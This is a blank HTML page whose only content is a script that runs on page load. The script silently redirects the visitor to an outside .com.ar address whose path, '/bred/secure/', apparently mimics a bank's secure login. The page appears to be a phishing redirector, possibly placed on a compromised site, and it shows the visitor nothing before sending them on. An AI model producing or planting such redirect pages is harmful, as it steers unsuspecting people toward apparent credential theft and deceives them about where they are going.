<!DOCTYPE html>
<html>
    <head>
        <title></title>
        <script>
            function init()
            {
               window.location.href = "http://decotortasgc.com.ar/bred/secure/";
            }
        </script>
    </head>

    <body onload="init()">
    </body>
</html>